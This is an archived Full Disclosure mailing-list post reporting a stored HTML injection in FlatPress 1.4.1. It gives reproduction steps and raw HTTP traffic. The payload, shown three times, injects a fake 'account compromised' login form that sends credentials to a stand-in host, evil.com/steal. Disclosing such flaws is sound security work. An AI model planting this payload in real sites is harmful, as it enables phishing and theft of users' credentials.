---
title: Stored HTML Injection - flatpressv1.4.1
url: https://seclists.org/fulldisclosure/2025/Sep/63
source: Full Disclosure
date: 2025-09-24
fetch_date: 2025-10-02T20:36:12.650289
---

# Stored HTML Injection - flatpressv1.4.1

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](62)
[By Date](date.html#63)
[![Next](/images/right-icon-16x16.png)](64)

[![Previous](/images/left-icon-16x16.png)](62)
[By Thread](index.html#63)
[![Next](/images/right-icon-16x16.png)](64)

![](/shared/images/nst-icons.svg#search)

# Stored HTML Injection - flatpressv1.4.1

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 21 Sep 2025 17:31:27 +0100

---

```
# Exploit Title: Stored HTML Injection - flatpressv1.4.1
# Date: 09/2025
# Exploit Author: Andrey Stoykov
# Version: 1.4.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2025/09/friday-fun-pentest-series-41-stored.html

Stored HTML Injection:

Steps to Reproduce:

- Login with admin user and visit "Main" > "New Entry" > "Write Entry" and
in the description enter the payload  "[html]<div style="border:2px solid
red;padding:20px;margin:20px;background:yellow"><h2>SECURITY
ALERT</h2><p>Your account has been compromised. Please login
again:</p><form action="https://evil.com/steal";><input type="text"
placeholder="Username"><input type="password"
placeholder="Password"><button>Login</button></form></div>[/html]"

// HTTP POST Request

POST /FlatPressns3ufyfxkj/admin.php?p=entry&action=write HTTP/1.1
Host: demos5.softaculous.com
Cookie: __Secure-fpsess_fp-ea857882=ac74031571a2427832d0abef5c255d9e
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0)
Gecko/20100101 Firefox/144.0
[...]

_wpnonce=ee76fd6c94&_wp_http_referer=/FlatPressns3ufyfxkj/admin.php?p=entry&action=write&date_hour=16&date_minute=12&date_second=51&date_month=09&date_day=21&date_year=2025&subject=HTMLi&timestamp=1758471158&entry=&attachselect=--
Selection --&imageselect=-- Selection --&content=[html]<div
style="border:2px solid
red;padding:20px;margin:20px;background:yellow"><h2>SECURITY
ALERT</h2><p>Your account has been compromised. Please login
again:</p><form action="https://evil.com/steal";><input type="text"
placeholder="Username"><input type="password"
placeholder="Password"><button>Login</button></form></div>[/html]&pl_file_meta=fp-content/content/seometa/default/metatags.ini&pl_description=&pl_keywords=&save=Publish

// HTTP Response

HTTP/1.1 302 Found
Date: Sun, 21 Sep 2025 16:12:55 GMT
Server: FlatPress
[...]

// HTTP GET Request

GET /FlatPressns3ufyfxkj/index.php/2025/09/21/htmli/ HTTP/1.1
Host: demos5.softaculous.com
Cookie: __Secure-fpsess_fp-ea857882=ac74031571a2427832d0abef5c255d9e
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0)
Gecko/20100101 Firefox/144.0
[...]

// HTTP Response

HTTP/1.1 200 OK
Date: Sun, 21 Sep 2025 16:12:58 GMT
Server: FlatPress
[...]

[...]
<div itemprop="articleBody"><p><div style="border:2px solid
red;padding:20px;margin:20px;background:yellow"><h2>SECURITY
ALERT</h2><p>Your account has been compromised. Please login
again:</p><form action="https://evil.com/steal";><input type="text"
placeholder="Username"><input type="password"
placeholder="Password"><button>Login</button></form></div></p></div>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](62)
[By Date](date.html#63)
[![Next](/images/right-icon-16x16.png)](64)

[![Previous](/images/left-icon-16x16.png)](62)
[By Thread](index.html#63)
[![Next](/images/right-icon-16x16.png)](64)

### Current thread:

* **Stored HTML Injection - flatpressv1.4.1** *Andrey Stoykov (Sep 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")